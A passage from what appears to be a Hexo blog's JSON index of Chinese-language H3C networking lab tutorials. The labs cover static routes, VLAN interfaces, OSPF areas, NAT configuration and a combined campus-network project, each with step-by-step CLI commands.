10.3.3.2 24 步骤 6：配置R3的接口IP 123456[R3]int g0/1[R3-GigabitEthernet0/1]ip address 10.4.4.3 24[R3-GigabitEthernet0/1]int g0/0[R3-GigabitEthernet0/0]ip address 10.3.3.3 24[R3-GigabitEthernet0/0]int g0/2[R3-GigabitEthernet0/2]ip address 192.168.2.1 24 步骤 7：配置R4的接口IP 12345678[R4]int g0/0[R4-GigabitEthernet0/0]ip address 10.1.1.4 24[R4-GigabitEthernet0/0]int g0/1[R4-GigabitEthernet0/1]ip address 10.4.4.4 24[R4-GigabitEthernet0/1]int g0/2[R4-GigabitEthernet0/2]ip address 10.6.6.4 24[R4-GigabitEthernet0/2]int g5/0[R4-GigabitEthernet5/0]ip address 10.5.5.4 24 步骤8：配置R5的接口IP 123456[R5]int g0/1[R5-GigabitEthernet0/1]ip address 10.5.5.5 24[R5-GigabitEthernet0/1]int g0/0[R5-GigabitEthernet0/0]ip address 10.6.6.5 24[R5-GigabitEthernet0/0]int g0/2[R5-GigabitEthernet0/2]ip address 192.168.3.1 24 2.按照需求配置静态路由，实现连接 PC 的业务网段互通 步骤 1：配置 192.168.1.0/24 网段到 192.168.2.0 网段的静态路由 1[R1]ip route-static 192.168.2.0 24 10.2.2.2 1[R2]ip route-static 192.168.2.0 24 10.3.3.3 步骤 2：配置 192.168.2.0/24 网段到 192.168.1.0 网段的静态路由 1[R3]ip route-static 192.168.1.0 24 10.4.4.4 1[R4]ip route-static 192.168.1.0 24 10.1.1.1 步骤 3：配置 192.168.1.0/24 网段到 192.168.3.0 网段的静态路由 1[R1]ip route-static 192.168.3.0 24 10.1.1.4 12[R4]ip route-static 192.168.3.0 24 10.5.5.5[R4]ip route-static 192.168.3.0 24 10.6.6.5 步骤 4：配置 192.168.2.0/24 网段到 192.168.3.0 网段的静态路由 1[R3]ip route-static 192.168.3.0 24 10.4.4.4 步骤 5：配置 192.168.3.0/24 网段到 192.168.1.0 网段的静态路由 12[R5]ip route-static 0.0.0.0 0 10.5.5.4[R5]ip route-static 0.0.0.0 0 10.6.6.4 步骤 6：配置 192.168.3.0/24 网段到 192.168.2.0 网段的静态路由 1[R4]ip route-static 192.168.2.0 24 10.4.4.3 3.验证PC之间的连通性 步骤 1：在PC6上pingPC7,发现可以ping通 步骤 2：在PC6上pingPC8,发现可以ping通 步骤 3：在PC7上pingPC8,发现可以ping通","raw":null,"content":null,"categories":[],"tags":[{"name":"实训-网络建设部分","slug":"实训-网络建设部分","permalink":"https://frankcao3.github.io/tags/%E5%AE%9E%E8%AE%AD-%E7%BD%91%E7%BB%9C%E5%BB%BA%E8%AE%BE%E9%83%A8%E5%88%86/"}]},{"title":"4.三层交换","slug":"数通/4.三层交换","date":"2020-08-14T16:00:00.000Z","updated":"2023-10-05T11:40:46.684Z","comments":true,"path":"posts/[object Object]/数通/4.三层交换/31730.html","link":"","permalink":"https://frankcao3.github.io/posts/[object%20Object]/%E6%95%B0%E9%80%9A/4.%E4%B8%89%E5%B1%82%E4%BA%A4%E6%8D%A2/31730","excerpt":"","text":"三层交换实验 实验拓扑 实验需求1.按照图示为 PC2 和 PC3 配置 IP 地址和网关2.PC2 属于 Vlan10，PC3 属于 Vlan20，在三层交换机上配置 Vlanif 三层接口实现 Vlan10 和 Vlan20 三层互通3.PC2 和 PC3 可以互通 实验解法1.在PC上 配置 IP 地址和网关 步骤 1：配置PC2的IP地址为i192.168.1.1&#x2F;24，网关为192.168.1.254 步骤2：配置PC2的IP地址为i192.168.2.1&#x2F;24，网关为192.168.2.254 2.PC2 属于 Vlan10，PC3 属于 Vlan20，在三层交换机上配置 Vlanif 三层接口实现 Vlan10 和 Vlan20 三层互通 步骤 1：在 SW1 上创建 Vlan10 和 Vlan20，并把 g1&#x2F;0&#x2F;1 接口加入 Vlan10，把 g1&#x2F;0&#x2F;2 接口加入 Vlan20 1234[SW1]vlan 10[SW1-vlan10]port g1/0/1[SW1-vlan10]vlan 20[SW1-vlan20]port g1/0/2 步骤 2：在 SW1 上对 Vlan10 和 Vlan20 开启 Vlanif 接口，并配置 Vlanif10 接口 IP 地址为 Vlan10 的网关地址 192.168.1.254/24，配置 Vlanif20 接口 IP 地址为 Vlan20 的网关地址 192.168.2.254/24 1234[SW1]interface Vlan-interface 10[SW1-Vlan-interface10]ip address 192.168.1.254 24[SW1-Vlan-interface10]interface Vlan-interface 20[SW1-Vlan-interface20]ip address 192.168.2.254 24 3.测试在 PC3 上 Ping PC4 ，可以 Ping 通 PC4","raw":null,"content":null,"categories":[],"tags":[{"name":"实训-网络建设部分","slug":"实训-网络建设部分","permalink":"https://frankcao3.github.io/tags/%E5%AE%9E%E8%AE%AD-%E7%BD%91%E7%BB%9C%E5%BB%BA%E8%AE%BE%E9%83%A8%E5%88%86/"}]},{"title":"5.OSPF","slug":"数通/5.OSPF","date":"2020-08-14T16:00:00.000Z","updated":"2023-10-05T11:40:46.686Z","comments":true,"path":"posts/[object Object]/数通/5.OSPF/38070.html","link":"","permalink":"https://frankcao3.github.io/posts/[object%20Object]/%E6%95%B0%E9%80%9A/5.OSPF/38070","excerpt":"","text":"OSPF 实验 实验拓扑 实验需求 按照图示配置 IP 地址 按照图示分区域配置 OSPF ，实现全网互通 为了路由结构稳定，要求路由器使用环回口作为 Router-id，ABR 的环回口宣告进骨干区域 实验解法1.按图所示配置 IP 地址和环回口 步骤 1：配置R1的接口地址和环回口 123456[R1]interface L0[R1-LoopBack0]ip address 1.1.1.1 32[R1-LoopBack0]interface g0/0[R1-GigabitEthernet0/0]ip address 100.1.1.1 24[R1-GigabitEthernet0/0]interface g0/1[R1-GigabitEthernet0/1]ip address 100.3.3.1 24 步骤 2：配置R2的接口地址和环回口 123456[R2]interface L0[R2-LoopBack0]ip address 2.2.2.2 32[R2-LoopBack0]interface g0/0[R2-GigabitEthernet0/0]ip address 100.1.1.2 24[R2-GigabitEthernet0/0]interface g0/1[R2-GigabitEthernet0/1]ip address 100.2.2.2 24 步骤 3：配置R3的接口地址和环回口 123456[R3]interface L0[R3-LoopBack0]ip address 3.3.3.3 32[R3-LoopBack0]interface g0/0[R3-GigabitEthernet0/0]ip address 100.2.2.3 24[R3-GigabitEthernet0/0]interface g0/1[R3-GigabitEthernet0/1]ip address 100.4.4.3 24 步骤 4：配置R4的接口地址和环回口 1234[R4]interface L0[R4-LoopBack0]ip address 4.4.4.4 32[R4-LoopBack0]interface g0/0[R4-GigabitEthernet0/0]ip address 100.3.3.4 24 步骤 5：配置R5的接口地址和环回口 1234[R4]interface L0[R4-LoopBack0]ip address 5.5.5.5 32[R4-LoopBack0]interface g0/0[R4-GigabitEthernet0/0]ip address 100.4.4.5 24 2.按照图示分区域配置 OSPF ，实现全网互通 步骤 1：在路由器上分别配置 OSPF，按区域宣告所有直连网段和环回口 123456[R1]ospf 1 router-id 1.1.1.1[R1-ospf-1]area 0[R1-ospf-1-area-0.0.0.0]network 1.1.1.1 0.0.0.0[R1-ospf-1-area-0.0.0.0]network 100.1.1.0 0.0.0.255[R1-ospf-1-area-0.0.0.0]area 1[R1-ospf-1-area-0.0.0.1]network 100.3.3.0 0.0.0.255 12345[R2]ospf 1 router-id 2.2.2.2[R2-ospf-1]area 0[R2-ospf-1-area-0.0.0.0]network 2.2.2.2 0.0.0.0[R2-ospf-1-area-0.0.0.0]network 100.1.1.0 0.0.0.255[R2-ospf-1-area-0.0.0.0]network 100.2.2.0 0.0.0.255 123456[R3]ospf 1 router-id 3.3.3.3[R3-ospf-1]area 0[R3-ospf-1-area-0.0.0.0]network 3.3.3.3 0.0.0.0[R3-ospf-1-area-0.0.0.0]network 100.2.2.0 0.0.0.255[R3-ospf-1-area-0.0.0.0]area 2[R3-ospf-1-area-0.0.0.2]network 100.4.4.0 0.0.0.255 1234[R4]ospf 1 router-id 4.4.4.4[R4-ospf-1]area 1[R4-ospf-1-area-0.0.0.1]network 4.4.4.4 0.0.0.0[R4-ospf-1-area-0.0.0.1]network 100.3.3.0 0.0.0.255 1234[R5]ospf 1 router-id 5.5.5.5[R5-ospf-1]area 2[R5-ospf-1-area-0.0.0.2]network 5.5.5.5 0.0.0.0[R5-ospf-1-area-0.0.0.2]network 100.4.4.0 0.0.0.255 3.检查是否全网互通 步骤 1：检查 R1 的邻居关闭表，发现R1 分别和 R2 和 R4 建立了邻接关系，状态为 FULL 步骤 2：检查 R3 的邻居关闭表，发现R3 分别和 R2 和 R5 建立了邻接关系，状态为 FULL 步骤3：检查 R1 的路由表 步骤4：检查 R3 的路由表 在R1上ping其他的所有路由器，看能否全部ping通。","raw":null,"content":null,"categories":[],"tags":[{"name":"实训-网络建设部分","slug":"实训-网络建设部分","permalink":"https://frankcao3.github.io/tags/%E5%AE%9E%E8%AE%AD-%E7%BD%91%E7%BB%9C%E5%BB%BA%E8%AE%BE%E9%83%A8%E5%88%86/"}]},{"title":"6.NAT","slug":"数通/6.NAT","date":"2020-08-14T16:00:00.000Z","updated":"2023-10-05T11:40:46.690Z","comments":true,"path":"posts/[object Object]/数通/6.NAT/38032.html","link":"","permalink":"https://frankcao3.github.io/posts/[object%20Object]/%E6%95%B0%E9%80%9A/6.NAT/38032","excerpt":"","text":"NAT 实验 实验拓扑 实验需求1.按照图示配置 IP 地址2.在 R1 上配置 EASY IP，使 PC1 和 PC2 可以访问互联网3.在 R1 上配置 NAT Server，使 R3 可以访问 PC2 的 FTP 服务 实验解法1.按图所示配置 IP 地址 步骤1：配置R5和R6的接口IP和默认路由，作为PC使用 12345[H3C]sys PC1[PC1]interface g0/0[PC1-GigabitEthernet0/0]ip address 192.168.1.1 24[PC1-GigabitEthernet0/0]quit[PC1]ip route-static 0.0.0.0 0 192.168.1.254 12345[H3C]sys PC2[PC2]interface g0/0[PC2-GigabitEthernet0/0]ip address 192.168.1.2 24[PC2-GigabitEthernet0/0]quit[PC2]ip route-static 0.0.0.0 0 192.168.1.254 步骤2：配置R1，R2，R3的接口IP 1234[R1]interface g0/0[R1-GigabitEthernet0/0]ip address 100.1.1.1 24[R1-GigabitEthernet0/0]interface g0/1[R1-GigabitEthernet0/1]ip address 192.168.1.254 24 1234[R2]interface g0/0[R2-GigabitEthernet0/0]ip address 100.1.1.2 24[R2-GigabitEthernet0/0]interface g0/1[R2-GigabitEthernet0/1]ip address 100.2.2.2 24 12[R3]interface g0/0[R3-GigabitEthernet0/0]ip address 100.2.2.3 24 2.R1 和 R3 上配置默认路由指向公网 步骤 1：配置R1的默认路由 1[R1]ip route-static 0.0.0.0 0 100.1.1.2 步骤 2：配置R3的默认路由 1[R3]ip route-static 0.0.0.0 0 100.2.2.2 3.在 R1 上配置 EASY IP，使 PC1 和 PC2 可以访问互联网 步骤 1：R1上创建基本 ACL，允许 192.168.1.0/24 网段 12[R1]acl basic 2000[R1-acl-ipv4-basic-2000]rule permit source 192.168.1.0 0.0.0.255 步骤 2：在 R1 的公网接口上配置 EASY IP 12[R1]interface g0/0[R1-GigabitEthernet0/1]nat outbound 2000 步骤 3：在 PC1和PC2上 Ping R3的公网地址，测试是否可以访问互联网 步骤 4：使用display nat session查看nat记录 6.在 R1 上配置 NAT Server，使 R3 可以访问 PC2 的 FTP 服务 步骤1：在PC2上配置 FTP 服务 123456[PC2]ftp server enable[PC2]local-user FrankNew local user added.[PC2-luser-manage-Frank]password simple 123456[PC2-luser-manage-Frank]service-type ftp[PC2-luser-manage-Frank]authorization-attribute user-role level-15 步骤 2：在 R1 的公网接口上配置 NAT SERVER，映射端口为20和21 123[R1]interface g0/0[R1-GigabitEthernet0/0]nat server protocol tcp global 100.1.1.1 20 21 inside 192.168.1.2 20 21 步骤 2：在 PCB 上测试是否能够通过 R1 的公网地址访问 FTPA 的 FTP 服务","raw":null,"content":null,"categories":[],"tags":[{"name":"实训-网络建设部分","slug":"实训-网络建设部分","permalink":"https://frankcao3.github.io/tags/%E5%AE%9E%E8%AE%AD-%E7%BD%91%E7%BB%9C%E5%BB%BA%E8%AE%BE%E9%83%A8%E5%88%86/"}]},{"title":"7.综合实验","slug":"数通/7.综合实验","date":"2020-08-14T16:00:00.000Z","updated":"2023-10-05T11:40:46.693Z","comments":true,"path":"posts/[object Object]/数通/7.综合实验/58901.html","link":"","permalink":"https://frankcao3.github.io/posts/[object%20Object]/%E6%95%B0%E9%80%9A/7.%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C/58901","excerpt":"","text":"综合项目实战 网络拓扑 项目需求1.按照图示配置ip地址，R1，R2，SW1创建Loopback0口用于OSPF的Router-id，INTERNET创建Loopback0口用于模拟互联网2.SW2和SW3作为接入交换机，分别把PC1接入到Vlan10，把PC2接入到Vlan203.SW1和SW2&#x2F;SW3分别连接两条线缆配置链路聚合4.交换机之间相连的链路配置为Trunk，并放行相关Vlan5.SW1作为汇聚交换机，创建Vlan三层接口，作为Vlan10和Vlan20的网关6.SW1与R1，R2配置单区域OSPF协议，使内网IP互通，使用Loopback0口地址作为Router-id7.R1和R2上分别配置EASY IP，使Vlan10和Vlan20的PC可以访问互联网（PC1和PC2可以ping通INTERNET的Loopback0口） 项目解法1.在SW1，SW2，SW3上配置VLAN和链路聚合 步骤1：在SW2上配置VLAN 10，以及链路聚合 12[SW2]vlan 10[SW2-vlan20]port g1/0/3 12345678[SW2]interface Bridge-Aggregation 1[SW2-Bridge-Aggregation1]interface g1/0/1[SW2-GigabitEthernet1/0/1]port link-aggregation group 1[SW2-GigabitEthernet1/0/1]interface g1/0/2[SW2-GigabitEthernet1/0/2]port link-aggregation group 1[SW2]interface bridge 1[SW2-Bridge-Aggregation1]port link-type trunk[SW2-Bridge-Aggregation1]port trunk permit vlan 10 步骤2：在SW3上配置VLAN 20，以及链路聚合 12[SW3]vlan 20[SW3-vlan20]port g1/0/3 12345678[SW3]int b 1[SW3-Bridge-Aggregation1]int g1/0/1[SW3-GigabitEthernet1/0/1]port link-a group 1[SW3-GigabitEthernet1/0/1]int g1/0/2[SW3-GigabitEthernet1/0/2]port link-a group 1[SW3-vlan20]int b 1[SW3-Bridge-Aggregation1]port link-t tr[SW3-Bridge-Aggregation1]port tr per vlan 20 步骤3：在SW1上配置VLAN 10，VLAN 20以及链路聚合 12345678910[SW1]int bri 1[SW1-Bridge-Aggregation1]int bri 2[SW1-Bridge-Aggregation2]int g1/0/3[SW1-GigabitEthernet1/0/3]port link-a group 1[SW1-GigabitEthernet1/0/3]int g1/0/4[SW1-GigabitEthernet1/0/4]port link-a group 1[SW1-GigabitEthernet1/0/4]int g1/0/5[SW1-GigabitEthernet1/0/5]port link-a group 2[SW1-GigabitEthernet1/0/5]int g1/0/6[SW1-GigabitEthernet1/0/6]port link-a group 2 12345678[SW1]vlan 10[SW1-vlan10]vlan 20[SW1]int bri 1[SW1-Bridge-Aggregation1]port link-t tr[SW1-Bridge-Aggregation1]port tr per vlan 10[SW1-Bridge-Aggregation1]int bri 2[SW1-Bridge-Aggregation2]port link-t tr[SW1-Bridge-Aggregation2]port tr per vlan 20 步骤4：在SW1上配置VLAN 10和VLAN 20的网关 1234[SW1]int vlan 10[SW1-Vlan-interface10]ip add 192.168.10.254 24[SW1-Vlan-interface10]int vlan 20[SW1-Vlan-interface20]ip add 192.168.20.254 24 此时PC1可以Ping 192.168.10.254，PC2可以Ping 192.168.20.254 2.配置SW1，R1，R2的OSPF协议，使内网互通 步骤1：在SW1上创建VLAN 111，VLAN 112并配置IP以及环回地址 12345678910[SW1]vlan 111[SW1-vlan111]port g1/0/1[SW1-vlan111]vlan 112[SW1-vlan112]port g1/0/2[SW1]interface vlan 111[SW1-Vlan-interface111]ip address 10.0.0.6 30[SW1-Vlan-interface111]interface vlan 112[SW1-Vlan-interface112]ip address 10.0.0.10 30[SW1]int L0[SW1-LoopBack0]ip add 10.1.1.11 32 步骤2：在SW1上配置OSPF协议 1234567[SW1]ospf router-id 10.1.1.11[SW1-ospf-1]area 0[SW1-ospf-1-area-0.0.0.0]network 10.0.0.4 0.0.0.3[SW1-ospf-1-area-0.0.0.0]network 10.0.0.8 0.0.0.3[SW1-ospf-1-area-0.0.0.0]network 192.168.10.0 0.0.0.255[SW1-ospf-1-area-0.0.0.0]network 192.168.20.0 0.0.0.255[SW1-ospf-1-area-0.0.0.0]network 10.1.1.11 0.0.0.0 步骤3：在R1上配置接口IP及OSPF协议 12345678[R1]int g0/0[R1-GigabitEthernet0/0]ip add 10.0.0.5 30[R1-GigabitEthernet0/0]int g0/1[R1-GigabitEthernet0/1]ip add 202.1.1.1 30[R1-GigabitEthernet0/1]int g0/2[R1-GigabitEthernet0/2]ip add 10.0.0.1 30[R1-GigabitEthernet0/2]int L0[R1-LoopBack0]ip add 10.1.1.1 32 12345[R1]ospf router 10.1.1.1[R1-ospf-1]area 0[R1-ospf-1-area-0.0.0.0]net 10.0.0.4 0.0.0.3[R1-ospf-1-area-0.0.0.0]net 10.0.0.0 0.0.0.3[R1-ospf-1-area-0.0.0.0]net 10.1.1.1 0.0.0.0 步骤4：在R2上配置接口IP及OSPF协议 12345678[R2]int g0/0[R2-GigabitEthernet0/0]ip add 10.0.0.9 30[R2-GigabitEthernet0/0]int g0/1[R2-GigabitEthernet0/1]ip add 67.1.1.1 30[R2-GigabitEthernet0/1]int g0/2[R2-GigabitEthernet0/2]ip add 10.0.0.2 30[R2-GigabitEthernet0/2]int L0[R2-LoopBack0]ip add 10.1.1.2 32 12345[R2]ospf router-id 10.1.1.2[R2-ospf-1]area 0[R2-ospf-1-area-0.0.0.0]net 10.0.0.8 0.0.0.3[R2-ospf-1-area-0.0.0.0]net 10.0.0.0 0.0.0.3[R2-ospf-1-area-0.0.0.0]net 10.1.1.2 0.0.0.0 步骤5：此时可以在SW1上查看OSPF邻居，而且PC1和PC2都可以Ping通10.1.1.1和10.1.1.2，内网是全通的 1234[SW1]display ospf peer Router ID Address Pri Dead-Time State Interface 10.1.1.1 10.0.0.5 1 32 Full/BDR Vlan111 10.1.1.2 10.0.0.9 1 39 Full/BDR Vlan112 3.配置R1和R2的静态路由和NAT协议 步骤1：配置INTERNET的接口IP和环回地址 123456[INTERNET]int g0/0[INTERNET-GigabitEthernet0/0]ip add 202.1.1.2 30[INTERNET-GigabitEthernet0/0]int g0/1[INTERNET-GigabitEthernet0/1]ip add 67.1.1.2 30[INTERNET-GigabitEthernet0/1]int L0[INTERNET-LoopBack0]ip add 100.1.1.1 32 步骤2：在R1和R2上配置静态路由 1[R1]ip route-static 0.0.0.0 0 202.1.1.2 1[R2]ip route-static 0.0.0.0 0 67.1.1.2 此时R1和R2都可以Ping通100.1.1.1（INTERNET的环回地址） 步骤3：在R1上配置EASY IP 12345[R1]acl bas 2000 [R1-acl-ipv4-basic-2000]rule permit source 192.168.10.0 0.0.0.255[R1-acl-ipv4-basic-2000]rule permit source 192.168.20.0 0.0.0.255[R1-acl-ipv4-basic-2000]int g0/1[R1-GigabitEthernet0/1]nat outbound 2000 步骤4：在R2上配置EASY IP 12345[R2]acl bas 2000[R2-acl-ipv4-basic-2000]rule per sou 192.168.10.0 0.0.0.255[R2-acl-ipv4-basic-2000]rule per sou 192.168.20.0 0.0.0.255[R2-acl-ipv4-basic-2000]int g0/1[R2-GigabitEthernet0/1]nat outbound 2000 步骤5：在R1和R2上配置 12[R1]ospf[R1-ospf-1]default-route-advertise 12[R2]ospf[R2-ospf-1]default-route-advertise 此时[SW1]dis ip rout，可看到顶部有如下内容 123Destination/Mask Proto Pre Cost NextHop Interface0.0.0.0/0 O_ASE2 150 1 10.0.0.5 Vlan111 10.0.0.9 Vlan112 此时PC1和PC2都可以Ping通100.1.1.1（外网）","raw":null,"content":null,"categories":[],"tags":[{"name":"实训-网络建设部分","slug":"实训-网络建设部分","permalink":"https://frankcao3.github.io/tags/%E5%AE%9E%E8%AE%AD-%E7%BD%91%E7%BB%9C%E5%BB%BA%E8%AE%BE%E9%83%A8%E5%88%86/"}]}]}